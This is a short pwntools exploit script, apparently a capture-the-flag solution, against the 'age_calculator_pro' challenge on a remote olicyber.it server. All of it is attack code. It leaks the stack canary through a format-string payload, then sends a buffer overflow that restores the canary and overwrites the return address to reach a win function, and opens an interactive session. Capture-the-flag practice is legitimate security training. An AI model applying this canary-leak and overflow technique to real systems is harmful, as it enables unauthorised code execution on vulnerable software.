from pwn import *

context.binary = ELF('binary/age_calculator_pro')
p = remote('agecalculatorpro.challs.olicyber.it', 38103)

winaddr = 0x4011f6

payloadleak = b"%17$p"
print(p.recvuntil(b'your name?').decode())
p.sendline(payloadleak)

canary = int(p.recvuntil(b", what's your birth year?", drop=True)[3:], 16)
payloadoverflow = b"A"*64 + b"B"*8 + p64(canary) + b"C"*8 + p64(winaddr)
p.sendline(payloadoverflow)

p.interactive()